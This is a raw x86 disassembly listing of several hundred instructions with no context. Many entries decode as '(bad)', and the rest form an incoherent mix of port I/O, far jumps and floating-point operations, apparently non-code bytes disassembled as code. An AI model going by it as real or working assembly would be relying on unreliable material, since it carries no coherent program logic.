  41bbd6:	lock xlat BYTE PTR ds:[ebx]
  41bbd8:	mov    eax,0xcff8f4cd
  41bbdd:	fadd   st(3),st
  41bbdf:	fcmovbe st,st(4)
  41bbe1:	in     al,0xdf
  41bbe3:	fadd   QWORD PTR [eax]
  41bbe5:	fcomip st,st(5)
  41bbe7:	out    0xf,eax
  41bbe9:	out    dx,eax
  41bbea:	push   cs
  41bbeb:	icebp  
  41bbec:	leave  
  41bbed:	loope  0x41bbde
  41bbef:	loope  0x41bbe3
  41bbf1:	lods   eax,DWORD PTR ds:[esi]
  41bbf2:	jecxz  0x41bbb9
  41bbf4:	(bad)  
  41bbf6:	iret   
  41bbf7:	out    dx,al
  41bbf8:	mov    ebx,0xc1fbd3f0
  41bbfd:	in     al,dx
  41bbfe:	push   es
  41bbff:	out    0xdb,eax
  41bc01:	fisttp QWORD PTR [ebx]
  41bc03:	dec    ecx
  41bc05:	(bad)  
  41bc06:	fcmove st,st(3)
  41bc08:	mov    BYTE PTR [edi],0xdd
  41bc0b:	loope  0x41bbd9
  41bc0d:	rol    dl,0xb6
  41bc10:	shr    al,1
  41bc12:	aam    0xe0
  41bc14:	loope  0x41bbe4
  41bc16:	mov    ecx,0xbb03f1eb
  41bc1b:	add    esi,edi
  41bc1d:	loope  0x41bbd8
  41bc1f:	fninit 
  41bc21:	fstp   st(5)
  41bc23:	in     al,0x4
  41bc25:	hlt    
  41bc26:	aad    0xf
  41bc28:	stc    
  41bc29:	in     al,0xef
  41bc2b:	(bad)  
  41bc2c:	in     al,dx
  41bc2d:	loope  0x41bbf1
  41bc2f:	retf   0xc2f5
  41bc32:	cli    
  41bc33:	out    dx,eax
  41bc34:	(bad)  
  41bc35:	lock enter 0xdbff,0xff
  41bc3a:	mov    cl,0xdb
  41bc3c:	shr    eax,1
  41bc3e:	jecxz  0x41bc36
  41bc40:	clc    
  41bc41:	jmp    0x41bc08
  41bc43:	ret    0xcac7
  41bc46:	test   DWORD PTR [esi+ecx*1],0xc3ea0efe
  41bc4d:	mov    dl,0xe0
  41bc4f:	jecxz  0x41bc26
  41bc51:	jmp    0xe4d6:0xe5b0d5d4
  41bc58:	mov    ecx,0xbaf9e2f5
  41bc5d:	in     al,dx
  41bc5e:	repz cli 
  41bc60:	ret    
  41bc61:	in     eax,0xf5
  41bc63:	fdiv   st(4),st
  41bc65:	(bad)  
  41bc66:	(bad)  
  41bc68:	into   
  41bc69:	(bad)  
  41bc6b:	repnz mov ecx,0xaeb2aca6
  41bc71:	in     al,dx
  41bc72:	rcl    edx,1
  41bc74:	idiv   dl
  41bc76:	clc    
  41bc77:	aad    0xf6
  41bc79:	sti    
  41bc7a:	fsincos 
  41bc7c:	(bad)  
  41bc7d:	cli    
  41bc7e:	out    dx,al
  41bc7f:	mov    esp,0xf8d2f6c7
  41bc84:	pop    es
  41bc85:	loopne 0x41bc52
  41bc87:	(bad)  
  41bc88:	stc    
  41bc89:	aam    0xa
  41bc8b:	(bad)  
  41bc8c:	out    dx,al
  41bc8d:	mov    eax,0xcbbcd7c9
  41bc92:	mov    cl,0xef
  41bc94:	idiv   DWORD PTR [edx-0xb41043c]
  41bc9a:	(bad)  
  41bc9c:	sti    
  41bc9d:	rol    DWORD PTR [edi],0xd9
  41bca0:	add    dh,al
  41bca2:	shl    ecx,cl
  41bca4:	or     ah,bh
  41bca6:	shl    ch,0xc9
  41bca9:	push   es
  41bcaa:	jmp    0x41bcb6
  41bcac:	rol    dl,1
  41bcae:	mov    ebp,0xc0efceaf
  41bcb3:	out    0xf5,eax
  41bcb5:	clc    
  41bcb6:	mov    bh,0xdb
  41bcb8:	fidivr DWORD PTR [edx-0x273e084b]
  41bcbe:	(bad)  
  41bcbf:	loop   0x41bc7c
  41bcc1:	fdivr  st(5),st
  41bcc3:	lds    eax,FWORD PTR [ebx]
  41bcc5:	loope  0x41bcc2
  41bcc7:	push   es
  41bcc8:	pop    es
  41bcc9:	out    0xda,al
  41bccb:	repnz icebp 
  41bccd:	shl    ecx,0xdd
  41bcd0:	in     eax,dx
  41bcd1:	in     al,0xc0
  41bcd3:	mov    dh,0xf5
  41bcd5:	loopne 0x41bcac
  41bcd7:	mov    esi,0xbffafbd6
  41bcdc:	rcl    ebx,0xcc
  41bcdf:	stc    
  41bce0:	rcl    eax,cl
  41bce2:	add    al,0xd0
  41bce4:	loope  0x41bcaa
  41bce6:	paddusw mm0,QWORD PTR ds:0xcaeaffdb
  41bced:	mov    cl,0xaf
  41bcef:	cmc    
  41bcf0:	jecxz  0x41bcd8
  41bcf2:	not    ebx
  41bcf4:	(bad)  
  41bcf5:	mov    dl,0xef
  41bcf7:	aam    0xcf
  41bcf9:	retf   
  41bcfa:	std    
  41bcfb:	jecxz  0x41bcb9
  41bcfd:	fdiv   st,st(1)
  41bcff:	int    0xdf
  41bd01:	add    cl,dh
  41bd03:	xlat   BYTE PTR ds:[ebx]
  41bd04:	fild   DWORD PTR ds:0xc806cff8
  41bd0a:	cld    
  41bd0b:	adc    ebp,DWORD PTR [ecx-0x33493b40]
  41bd11:	mov    al,0xf7
  41bd13:	shl    BYTE PTR [edi-0x42360e4e],0xfe
  41bd1a:	aad    0xd8
  41bd1c:	imul   esi
  41bd1e:	std    
  41bd1f:	ret    0xdcc7
  41bd22:	loope  0x41bd0e
  41bd24:	rol    eax,1
  41bd26:	jmp    0x41bce4
  41bd28:	pop    es
  41bd29:	fsub   st,st(2)
  41bd2b:	rcl    cl,0xf0
  41bd2e:	enter  0xcdcd,0xd2
  41bd32:	(bad)  
  41bd34:	(bad)  
  41bd36:	in     eax,0xed
  41bd38:	cmc    
  41bd39:	rcr    esi,1
  41bd3b:	add    cl,ch
  41bd3d:	in     al,dx
  41bd3e:	sti    
  41bd3f:	mov    ebp,0x4e5e2d2
  41bd44:	ret    0xc6d4
  41bd47:	or     ah,al
  41bd49:	or     eax,0xbdc4e5db
  41bd4e:	fstp   st(6)
  41bd50:	jmp    0xe9376743
  41bd55:	(bad)  
  41bd56:	icebp  
  41bd57:	stc    
  41bd58:	iret   
  41bd59:	stc    
  41bd5a:	add    dh,dl
  41bd5c:	div    bh
  41bd5e:	mov    esp,0xf7d106b8
  41bd63:	fiadd  WORD PTR ds:0xc5c803e8
  41bd69:	adc    eax,ebp
  41bd6b:	add    bl,al
  41bd6d:	enter  0xc3c9,0xc3
  41bd71:	out    0xf2,eax
  41bd73:	div    esp
  41bd75:	(bad)  
  41bd76:	not    ch
  41bd78:	retf   0xb4f5
  41bd7b:	(bad)  
  41bd7d:	cld    
  41bd7e:	fadd   st(0),st
  41bd80:	pop    es
  41bd81:	not    eax
  41bd83:	fsubrp st(5),st
  41bd85:	rol    edi,0xe6
  41bd88:	jmp    0xe3108777
  41bd8d:	out    0xc3,al
  41bd8f:	ret    0xc2ab
  41bd92:	jmp    0xbeb4:0xd6b4c7f9
  41bd99:	into   
  41bd9a:	loop   0x41bd9f
  41bd9c:	int3   
  41bd9d:	xlat   BYTE PTR ds:[ebx]
  41bd9e:	mov    ebp,0xdbd4bbe5
  41bda3:	(bad)  
  41bda4:	xlat   BYTE PTR ds:[ebx]
  41bda5:	add    al,ah
  41bda7:	cmc    
  41bda8:	add    DWORD PTR [esi],ecx
  41bdaa:	add    esp,esp
  41bdac:	shr    BYTE PTR [ecx-0x1c42181e],0xca
  41bdb3:	out    0xdb,eax
  41bdb5:	mov    edx,0xefcfc6c5
  41bdba:	clc    
  41bdbb:	add    dh,BYTE PTR [edi-0x29470f44]
  41bdc1:	add    bh,bh
  41bdc3:	cld    
  41bdc4:	in     al,0x9
  41bdc6:	out    dx,al
  41bdc7:	into   
  41bdc8:	in     eax,0xfe
  41bdca:	in     eax,0x4
  41bdcc:	fdivr  st(3),st
  41bdce:	(bad)
  41bdd2:	mov    dl,0xd4
  41bdd4:	out    0xf1,eax
  41bdd6:	mov    bh,0xfe
  41bdd8:	(bad)  
  41bdda:	div    bh
  41bddc:	enter  0xeece,0x3
  41bde0:	(bad)
  41bde3:	not    bh
  41bde5:	add    dh,bh
  41bde7:	add    edi,ebp
  41bde9:	out    0xf3,eax
  41bdeb:	in     eax,dx
  41bdec:	out    0xee,al
  41bdee:	int    0xbc
  41bdf0:	aam    0xc8
  41bdf2:	into   
  41bdf3:	enter  0xd2e9,0xff
  41bdf7:	shr    esp,cl
  41bdf9:	retf   
  41bdfa:	fidiv  WORD PTR [eax-0x52b1dfe]
  41be00:	(bad)  
  41be01:	sti    
  41be02:	(bad)  
  41be03:	loope  0x41bdee
  41be05:	les    ecx,FWORD PTR [esi]
  41be07:	dec    edx
  41be09:	aam    0xef
  41be0b:	(bad)  
  41be0c:	lods   eax,DWORD PTR ds:[esi]
  41be0d:	retf   0xedb1
  41be10:	lock call 0xdb377a0a
  41be16:	int3   
  41be17:	retf   0xf5c4
  41be1a:	mov    esp,0xf6f8cce2
  41be1f:	xabort 0xc7
  41be22:	ffreep st(7)
  41be24:	out    0xf6,al
  41be26:	test   ch,0xc4
  41be29:	loop   0x41be0f
  41be2b:	std    
  41be2c:	ret    
  41be2d:	call   0xc52c9619
  41be32:	lods   al,BYTE PTR ds:[esi]
  41be33:	ret    0xc6d7
  41be36:	sar    bh,cl
  41be38:	in     eax,0xf1
  41be3a:	sar    DWORD PTR [ebp-0x20010b26],1
  41be40:	jecxz  0x41be2d
  41be42:	ret    
  41be43:	jmp    0xfb18aa32
  41be48:	add    ebx,ebx
  41be4a:	(bad)  
  41be4b:	in     al,dx
  41be4c:	in     eax,0xc5
  41be4e:	shr    ah,cl
  41be50:	stos   DWORD PTR es:[edi],eax
  41be51:	jmp    0xfb2b6f02
  41be56:	mov    ebx,0xf0f0e9e9
  41be5b:	aad    0xbc
  41be5d:	inc    DWORD PTR [esi]
  41be5f:	std    
  41be60:	xlat   BYTE PTR ds:[ebx]
  41be61:	add    ah,dl
  41be63:	cld    
  41be64:	lock out dx,eax
  41be66:	cli    
  41be67:	leave  
  41be68:	add    ebx,ecx
  41be6a:	pop    es
  41be6b:	or     eax,0xc0e7d3bf
  41be70:	jmp    0xe8119649
  41be75:	rcr    edi,cl
  41be77:	call   0xdb40b636
  41be7c:	mov    ebp,0xc2f3edc3
  41be81:	mov    esp,0xc8d6c6d0
  41be86:	stc    
  41be87:	out    0xf8,eax
  41be89:	ret    0x1103
  41be8c:	call   0xf4318f7d
  41be91:	leave  
  41be92:	shr    dl,0xcf
  41be95:	cli    
  41be96:	cli    
  41be97:	in     eax,0xec
  41be99:	ffreep st(3)
  41be9b:	sar    DWORD PTR [edi-0x39391e11],1
  41bea1:	mov    esp,0xe408b8c0
  41bea6:	jmp    0xe23d998a
  41beab:	retf   
  41beac:	out    dx,al
  41bead:	stos   BYTE PTR es:[edi],al
  41beae:	lods   al,BYTE PTR ds:[esi]
  41beaf:	in     eax,dx
  41beb0:	in     al,0xcf
  41beb2:	mov    cl,0xeb
  41beb4:	aad    0xfb
  41beb6:	mov    cl,0xd3
  41beb8:	stc    
  41beb9:	mov    ebp,0xd3b9d3ea
  41bebe:	out    dx,eax
  41bebf:	loope  0x41bebe
  41bec1:	add    bh,al
  41bec3:	mov    eax,0xd4c7eb0b
  41bec8:	cli    
  41bec9:	fisttp DWORD PTR [eax]
  41becb:	or     al,0xf1
  41becd:	lods   eax,DWORD PTR ds:[esi]
  41bece:	iret   
  41becf:	repnz aam 0xd1
  41bed2:	ror    esp,0xcf
  41bed5:	sar    dl,0xe4
  41bed8:	fdivr  QWORD PTR [ebx-0x1fff0c12]
  41bede:	(bad)  
  41bedf:	in     eax,0xf7
  41bee1:	clc    
  41bee2:	f2xm1  
  41bee4:	xlat   BYTE PTR ds:[ebx]
  41bee5:	add    edi,ebp
  41bee7:	aam    0xe0
  41bee9:	add    esi,ebx
  41beeb:	jmp    0xcef4:0xe3cdc7c7
  41bef2:	vpsubusw ymm4,ymm1,ymm5
  41bef6:	mov    ah,0xbe
  41bef8:	(bad)  
  41befa:	shr    esp,1
  41befc:	mov    bh,0xe0
  41befe:	out    0x7,al
  41bf00:	cmc    
  41bf01:	fidivr DWORD PTR [ecx+0xb0ffdff]
  41bf07:	add    edi,edx
  41bf09:	enter  0xe8f9,0xcd
  41bf0d:	jecxz  0x41bedf
  41bf0f:	out    dx,eax
  41bf10:	ret    0xe5cc
  41bf13:	hlt    
  41bf14:	(bad)  
  41bf16:	leave  
  41bf17:	in     eax,0xfa
  41bf19:	int3   
  41bf1a:	icebp  
  41bf1b:	add    edi,DWORD PTR [edx-0x1a3f0918]
  41bf21:	in     al,0xa
  41bf23:	xlat   BYTE PTR ds:[ebx]
  41bf24:	leave  
  41bf25:	mov    esi,0x409f6e5
  41bf2a:	int    0xd9
  41bf2c:	jmp    0xed317010
  41bf31:	rcl    ebx,cl
  41bf33:	leave  
  41bf34:	repz aad 0xf9
  41bf37:	into   
  41bf38:	repz aad 0xeb
  41bf3b:	fyl2xp1 
  41bf3d:	fcomip st,st(3)
  41bf3f:	in     eax,0xd7
  41bf41:	sti    
  41bf42:	push   es
  41bf43:	mov    eax,0xe1cfe2ff
  41bf48:	or     eax,0xf2c8e10c
  41bf4d:	jmp    0x41bf1c
  41bf4f:	fmulp  st(6),st
  41bf51:	sti    
  41bf52:	hlt    
  41bf53:	into   
  41bf54:	mov    ebx,0xedb0eceb
  41bf59:	clc    
  41bf5a:	(bad)  
  41bf5b:	out    dx,al
  41bf5c:	mov    esi,0xfffecfb6
  41bf61:	mov    esi,0xc5fef404
  41bf66:	loop   0x41bf5d
  41bf68:	or     eax,DWORD PTR [eax]
  41bf6a:	loop   0x41bf6a
  41bf6c:	lods   eax,DWORD PTR ds:[esi]
  41bf6d:	(bad)  
  41bf6e:	mov    al,0xdd
  41bf70:	retf   0xe1e0
  41bf73:	test   al,0xd5
  41bf75:	aad    0xe6
  41bf77:	(bad)  
  41bf78:	shl    BYTE PTR [ebp-0x93506],cl
  41bf7e:	jecxz  0x41bf85
  41bf80:	repnz test DWORD PTR [esi],0xcaf4c5eb
  41bf87:	or     edi,edi
  41bf89:	add    eax,0xeecacd0b
  41bf8e:	repz (bad) 
  41bf90:	jmp    0x41bf80
  41bf92:	test   bl,0xcc
  41bf95:	mov    bh,0xb8
  41bf97:	mov    eax,0xccbbb5d6
  41bf9c:	(bad)  
  41bf9d:	mov    eax,0x3bfeee1
  41bfa2:	mov    ecx,0x90f0acb
  41bfa7:	loopne 0x41bf92
  41bfa9:	in     al,dx
  41bfaa:	fadd   QWORD PTR [ecx]
  41bfac:	enter  0xf3aa,0xc2
  41bfb0:	(bad)  
  41bfb1:	out    dx,eax
  41bfb2:	lods   al,BYTE PTR ds:[esi]
  41bfb3:	retf   0xf2ca
  41bfb6:	jmp    0xd137bb70
  41bfbb:	rcr    dl,1
  41bfbd:	rol    ebx,1
  41bfbf:	fadd   QWORD PTR ds:0xdfe2fbe4
  41bfc5:	(bad)  
  41bfc6:	fisttp DWORD PTR [ebx]
  41bfc8:	fcomp  st(3)
  41bfca:	out    dx,al
  41bfcb:	adc    esi,DWORD PTR [edx-0x2932212e]
  41bfd1:	leave  
  41bfd2:	mov    ebx,0xcdb7b3b0
  41bfd7:	mov    al,0xb8
  41bfd9:	mov    edx,0xdefdefb5
  41bfde:	xlat   BYTE PTR ds:[ebx]
  41bfdf:	int3   
  41bfe0:	fsubrp st(1),st
  41bfe2:	mov    ecx,0xe7f4dac0
  41bfe7:	fld    QWORD PTR [ecx]
  41bfe9:	enter  0x10e,0xab
  41bfed:	mov    eax,0xdcc0ceeb
  41bff2:	out    0xdb,eax
  41bff4:	out    dx,al
  41bff5:	lock iret 
  41bff7:	out    dx,al
  41bff8:	jmp    0x41bfcb
  41bffa:	fdivp  st(0),st
  41bffc:	(bad)  
  41bffe:	jecxz  0x41bfe6
  41c000:	fadd   st(0),st
  41c002:	(bad)  
  41c003:	add    eax,edi
  41c005:	(bad)  
  41c006:	out    0xfc,eax
  41c008:	in     eax,0xd
  41c00a:	out    dx,eax
  41c00b:	jmp    0xf2d3:0xe9a5cebf
  41c012:	mov    ah,0xc7
  41c014:	mov    edx,0xf7d6bfed
  41c019:	not    ch
  41c01b:	cli    
  41c01c:	loope  0x41c00e
  41c01e:	sti    
  41c01f:	add    ebx,ebx
  41c021:	fidivr DWORD PTR [edi+esi*8-0x250023f5]
  41c028:	or     ebx,esp
  41c02a:	or     ebp,eax
  41c02c:	retf   0xb2f0
  41c02f:	shr    esp,cl
  41c031:	icebp  
  41c032:	enter  0xebe9,0xc9
  41c036:	int    0xc4
  41c038:	cli    
  41c039:	fucomip st,st(1)
  41c03b:	fidivr WORD PTR [ebx-0x12193003]
  41c041:	icebp  
  41c042:	(bad)  
  41c043:	jmp    0x41c04d
  41c045:	hlt    
  41c046:	cmc    
  41c047:	enter  0xf307,0xde
  41c04b:	adc    ebp,DWORD PTR [ecx-0x3b28293b]
  41c051:	shl    BYTE PTR [edx-0xf51280e],1
  41c057:	sti    
  41c058:	fucomip st,st(4)
  41c05a:	mov    ebx,0xd4fccff4
  41c05f:	stc    
  41c060:	aad    0xe7
  41c062:	add    al,0xb8
  41c064:	(bad)  
  41c065:	cmc    
  41c066:	hlt    
  41c067:	out    dx,al
  41c068:	jmp    0x41c04c
  41c06a:	loop   0x41c030
  41c06c:	in     eax,dx
  41c06d:	xlat   BYTE PTR ds:[ebx]
  41c06e:	fdivrp st(2),st
  41c070:	mov    dl,0xed
  41c072:	call   0xedf78d29
  41c077:	mov    dh,0xd2
  41c079:	mov    eax,0xbefef9d9
  41c07e:	mov    esi,0xfcfceddc
  41c083:	(bad)  
  41c085:	hlt    
  41c086:	or     cl,ch
  41c088:	retf   
  41c089:	sti    
  41c08a:	loop   0x41c064
  41c08c:	retf   
  41c08d:	call   0xb50a703b
  41c092:	cmc    
  41c093:	xlat   BYTE PTR ds:[ebx]
  41c094:	out    dx,al
  41c095:	mov    ah,0xd4
  41c097:	fsubrp st(5),st
  41c099:	mov    ah,0xc3
  41c09b:	add    ecx,esi
  41c09d:	fdiv   st,st(4)
  41c09f:	(bad)  
  41c0a1:	(bad)  
  41c0a3:	add    edi,edi
  41c0a5:	(bad)  
  41c0a6:	out    dx,eax
  41c0a7:	add    al,bh
  41c0a9:	out    dx,eax
  41c0aa:	les    edx,FWORD PTR [ebx]
  41c0ac:	mov    eax,0xefc8e4cd
  41c0b1:	out    dx,eax
  41c0b2:	aam    0xf4
  41c0b4:	repnz repnz retf 
  41c0b7:	mov    edi,0xbce3ece5
  41c0bc:	(bad)  
  41c0bd:	cld    
  41c0be:	shl    dh,0xd6
  41c0c1:	shl    ecx,0xc2
  41c0c4:	(bad)  
  41c0c5:	stc    
  41c0c6:	fst    st(6)
  41c0c8:	out    0x8,eax
  41c0ca:	out    dx,eax
  41c0cb:	leave  
  41c0cc:	mov    bl,0xf2
  41c0ce:	jmp    0xef2d86b0
  41c0d3:	rcr    edx,1
  41c0d5:	mov    edx,0xcbf2fbe6
  41c0da:	(bad)  
  41c0dc:	mov    esp,0xd5c000
  41c0e1:	rcl    eax,cl
  41c0e3:	retf   
  41c0e4:	fld    QWORD PTR [esi+edi*8]
  41c0e7:	lds    eax,FWORD PTR [ecx]
  41c0e9:	loopne 0x41c0ea
  41c0eb:	repnz into 
  41c0ed:	bnd ret 
  41c0ef:	mov    ebp,0xf1f4cff3
  41c0f4:	vpsllw xmm1,xmm6,xmm7
  41c0f8:	xlat   BYTE PTR ds:[ebx]
  41c0f9:	cmc    
  41c0fa:	mov    eax,0xcdf3cce2
  41c0ff:	loop   0x41c0c2
  41c101:	sar    DWORD PTR [ecx-0x2293e15],cl
  41c107:	lds    eax,FWORD PTR [eax]
  41c109:	std    
  41c10a:	lds    eax,FWORD PTR [ebx]
  41c10c:	lds    ebp,FWORD PTR [edi-0x2d2d3533]
  41c112:	aam    0xb3
  41c114:	mov    dl,0xd6
  41c116:	retf   
  41c117:	(bad)  
  41c119:	mov    eax,0xcc01edd3
  41c11e:	aam    0xfb
  41c120:	in     al,dx
  41c121:	fisttp DWORD PTR [ebx]
  41c123:	rol    BYTE PTR ds:0xe4d8bde4,1
  41c129:	in     al,0xcf
  41c12b:	out    0xc1,al
  41c12d:	call   0xb3ed9829
  41c132:	ret    0xc9e2
  41c135:	mov    dh,0xb6
  41c137:	int    0xe4
  41c139:	in     eax,dx
  41c13a:	rcr    bh,1
  41c13c:	(bad)  
  41c13d:	rcr    ebx,cl
  41c13f:	fnstsw WORD PTR [ebp-0x14143943]
  41c145:	rol    BYTE PTR [esi],0xe4
  41c148:	fdiv   st,st(4)
  41c14a:	int3   
  41c14b:	add    eax,0xb1a8cfd0
  41c150:	mov    ch,0xb1
  41c152:	ror    bl,cl
  41c154:	mov    cl,0xf5
  41c156:	repnz test cl,0xf4
  41c15a:	aad    0xb8
  41c15c:	aam    0x1
  41c15e:	ret    0xe1d2
  41c161:	clc    
  41c162:	add    al,BYTE PTR [eax]
  41c164:	out    0x5,al
  41c166:	or     ebp,edx
  41c168:	or     eax,0xe903ffe5
  41c16d:	out    0xae,eax
  41c16f:	aad    0xc1
  41c171:	xlat   BYTE PTR ds:[ebx]
  41c172:	out    0xc8,al
  41c174:	out    0xcd,eax
  41c176:	mov    ah,0xd0
  41c178:	idiv   BYTE PTR [ebp-0x742fc02]
  41c17e:	in     al,dx
  41c17f:	mov    ebp,0xdbfff802
  41c184:	jmp    0x41c17d
  41c186:	loope  0x41c192
  41c188:	jecxz  0x41c179
  41c18a:	or     eax,0xe5eecae5
  41c18f:	repnz (bad) 
  41c191:	(bad)  
  41c192:	in     eax,0xe4
  41c194:	sti    
  41c195:	mov    ah,0xe9
  41c197:	xlat   BYTE PTR ds:[ebx]
  41c198:	sar    edx,1
  41c19a:	mov    ebx,0xfebdf9da
  41c19f:	push   es
  41c1a0:	rcl    eax,1
  41c1a2:	sti    
  41c1a3:	retf   0xe6d9
  41c1a6:	loopne 0x41c1b1
  41c1a8:	or     eax,edx
  41c1aa:	or     bl,ch
  41c1ac:	fadd   st(1),st
  41c1ae:	scas   al,BYTE PTR es:[edi]
  41c1af:	lods   al,BYTE PTR ds:[esi]
  41c1b0:	retf   0xe1c3
  41c1b3:	sti    
  41c1b4:	lock jmp 0x41c191
  41c1b7:	in     al,0xb9
  41c1b9:	rcr    ebp,cl
  41c1bb:	aad    0xd5
  41c1bd:	xlat   BYTE PTR ds:[ebx]
  41c1be:	fcomi  st,st(3)
  41c1c0:	jecxz  0x41c1c4
  41c1c2:	jecxz  0x41c199
  41c1c4:	(bad)  
  41c1c6:	jmp    0xfc4088c7
  41c1cb:	fnstsw WORD PTR [ecx-0x9113718]
  41c1d1:	rol    bh,cl
  41c1d3:	out    0xaf,eax
  41c1d5:	out    0xde,eax
  41c1d7:	(bad)  [ebx-0x333c3025]
  41c1dd:	(bad)  
  41c1df:	fdiv   st(5),st
  41c1e1:	in     al,0xd8
  41c1e3:	or     ebp,ebx
  41c1e5:	test   DWORD PTR [edi],0xc405cf06
  41c1eb:	clc    
  41c1ec:	retf   
  41c1ed:	in     eax,dx
  41c1ee:	out    dx,eax
  41c1ef:	lock icebp 
  41c1f1:	rol    ebx,cl
  41c1f3:	shl    ch,1
  41c1f5:	call   0xc93292be
  41c1fa:	shr    eax,cl
  41c1fc:	in     al,dx
  41c1fd:	repnz rcr cl,1
  41c200:	ret    
  41c201:	ret    
  41c202:	repz neg edi
  41c205:	test   BYTE PTR [eax],0xd6
  41c208:	fmul   st(5),st
  41c20a:	or     bh,al
  41c20c:	int    0xcc
  41c20e:	scas   eax,DWORD PTR es:[edi]
  41c20f:	out    dx,al
  41c210:	mov    esp,0xd3d2acf5
  41c215:	(bad)
  41c218:	(bad)  
  41c21a:	mov    ebp,0xbfd0f2b8
  41c21f:	ret    0xdbd3
  41c222:	std    
  41c223:	fiadd  DWORD PTR [esi]
  41c225:	fndisi(8087 only) 
  41c227:	(bad)  
  41c229:	ret    0xf302
  41c22c:	shl    esp,0xce
  41c22f:	(bad)  
  41c230:	call   0xb9f9aa1e
  41c235:	out    dx,al
  41c236:	int3   
  41c237:	mov    eax,0xd4eab2be
  41c23c:	fidivr WORD PTR [esi+0x3d9f5e1]
  41c242:	sar    esi,cl
  41c244:	push   es
  41c245:	add    al,0x7
  41c247:	aam    0x4
  41c249:	fild   DWORD PTR [ecx]
  41c24b:	int    0xab
  41c24d:	jecxz  0x41c231
  41c24f:	enter  0xc4b6,0xe8
  41c253:	jmp    0xbedd:0xc4d7b2d8
  41c25a:	cld    
  41c25b:	iret   
  41c25c:	shl    DWORD PTR [esi-0x3202405],1
  41c262:	out    0xd6,eax
  41c264:	or     edi,ebp
  41c266:	(bad)  
  41c267:	hlt    
  41c268:	dec    BYTE PTR [ecx]
  41c26a:	into   
  41c26b:	pop    es
  41c26c:	mov    eax,0xe8eec4e9
  41c271:	lock jecxz 0x41c244
  41c274:	(bad)  
  41c275:	fmul   st,st(4)
  41c277:	mov    ah,0xcd
  41c279:	mov    dl,0xfb
  41c27b:	fdiv   st,st(2)
  41c27d:	fadd   DWORD PTR [edx]
  41c27f:	add    esp,ebx
  41c281:	in     al,dx
  41c282:	fisttp WORD PTR [ecx]
  41c284:	add    al,bh
  41c286:	fld    QWORD PTR [ecx]
  41c288:	out    dx,al
  41c289:	sti    
  41c28a:	pop    es
  41c28b:	or     ah,ah
  41c28d:	xlat   BYTE PTR ds:[ebx]
  41c28e:	mov    bh,0xc1
  41c290:	mov    bh,0xc8
  41c292:	int3   
  41c293:	mov    ebx,0xf5dfe5e0
  41c298:	repz in al,0xf2
  41c29b:	rcl    bh,cl
  41c29d:	out    dx,al
  41c29e:	fcmovnb st,st(3)
  41c2a0:	mov    ebx,0x5e0e0c4
  41c2a5:	std    
  41c2a6:	(bad)  
  41c2a7:	or     bl,dl
  41c2a9:	loop   0x41c26f
  41c2ab:	in     eax,dx
  41c2ac:	call   0xe9117362
  41c2b1:	mov    ah,0xf5
  41c2b3:	rcl    ecx,0xc8
  41c2b6:	fsubr  st,st(1)
  41c2b8:	shr    cl,cl
  41c2ba:	test   ebx,0xd6d2f001
  41c2c0:	cld    
  41c2c1:	fincstp 
  41c2c3:	in     al,0xc2
  41c2c5:	xlat   BYTE PTR ds:[ebx]
  41c2c6:	idiv   bh
  41c2c8:	ret    
  41c2c9:	loopne 0x41c2de
  41c2cb:	fild   QWORD PTR [edi-0x3f48563d]
  41c2d1:	jmp    0x41c288
  41c2d3:	mov    cl,0xe9
  41c2d5:	out    0xd8,al
  41c2d7:	mov    ebx,0xd1d7dad6
  41c2dc:	mov    edi,0x4fadddb
  41c2e1:	hlt    
  41c2e2:	(bad)  
  41c2e4:	sar    ah,0xf5
  41c2e7:	(bad)
  41c2ea:	enter  0xcc0b,0xcf
  41c2ee:	(bad)
  41c2f1:	in     eax,dx
  41c2f2:	jmp    0x41c2e2
  41c2f4:	scas   eax,DWORD PTR es:[edi]
  41c2f5:	int    0xf3
  41c2f7:	stc    
  41c2f8:	mov    esi,0xf2f7bdd6
  41c2fd:	icebp  
  41c2fe:	out    0xe5,al
  41c300:	mov    esp,0xc5d4bcfb
  41c305:	pmuludq mm1,QWORD PTR [edi]
  41c308:	into   
  41c309:	(bad)  
  41c30a:	cli    
  41c30b:	loope  0x41c2cf
  41c30d:	loopne 0x41c2df
  41c30f:	imul   BYTE PTR [esi-0xf162a2a]
  41c315:	repz enter 0xf7f0,0xf6
  41c31a:	add    dh,al
  41c31c:	mov    bh,0xde
  41c31e:	rcr    bh,cl
  41c320:	add    dh,cl
  41c322:	mov    ecx,0xe403ffca
  41c327:	or     bh,dh
  41c329:	iret   
  41c32a:	jmp    0x41c30e
  41c32c:	loope  0x41c2de
  41c32e:	retf   
  41c32f:	not    ebp
  41c331:	in     eax,dx
  41c332:	jmp    0xc60eb0fb
  41c337:	int3   
  41c338:	jmp    0xff00:0xedf2cdec
  41c33f:	mov    esi,0xbb9d2e1
  41c344:	lock inc DWORD PTR [eiz*8-0x1503163b]
  41c34c:	lods   al,BYTE PTR ds:[esi]
  41c34d:	jecxz  0x41c2f7
  41c34f:	rol    ch,0xad
  41c352:	int3   
  41c353:	jmp    0x41c34f
  41c355:	out    0xd0,eax
  41c357:	(bad)  
  41c358:	call   0x11cb41a
  41c35d:	add    bh,al
  41c35f:	out    0xf7,eax
  41c361:	add    al,BYTE PTR ds:0xcffede07
  41c367:	clc    
  41c368:	or     al,dh
  41c36a:	(bad)
  41c36d:	icebp  
  41c36e:	in     al,dx
  41c36f:	mov    bh,0xe4
  41c371:	mov    al,0xad
  41c373:	mov    edx,0xaccdfbed
  41c378:	aad    0xb9
  41c37a:	int3   
  41c37b:	stc    
  41c37c:	idiv   DWORD PTR [ecx-0x82b2448]
  41c382:	(bad)  
  41c383:	add    eax,0x80707fb
  41c388:	in     al,0xcf
  41c38a:	fucomp st(0)
  41c38c:	jecxz  0x41c334
  41c38e:	mov    edi,0xd6edd2e0
  41c393:	enter  0xd8f3,0xe5
  41c397:	hlt    
  41c398:	icebp  
  41c399:	faddp  st(3),st
  41c39b:	mov    ecx,0x5f4dbbc
  41c3a0:	loop   0x41c378
  41c3a2:	icebp  
  41c3a3:	repnz rol DWORD PTR [edx],1
  41c3a6:	std    
  41c3a7:	mov    BYTE PTR ds:0xf2d812fb,0xf2
  41c3ae:	iret   
  41c3af:	ret    0xf2e1
  41c3b2:	into   
  41c3b3:	repz shl ch,1
  41c3b6:	enter  0xfed5,0xf4
  41c3ba:	shl    cl,cl
  41c3bc:	out    dx,al
  41c3bd:	loopne 0x41c38b
  41c3bf:	idiv   DWORD PTR [eax+eiz*8-0x2515020f]
  41c3c6:	out    0xe5,al
  41c3c8:	or     ebx,ebp
  41c3ca:	add    eax,0xe2c5aee4
  41c3cf:	mov    dh,0xc2
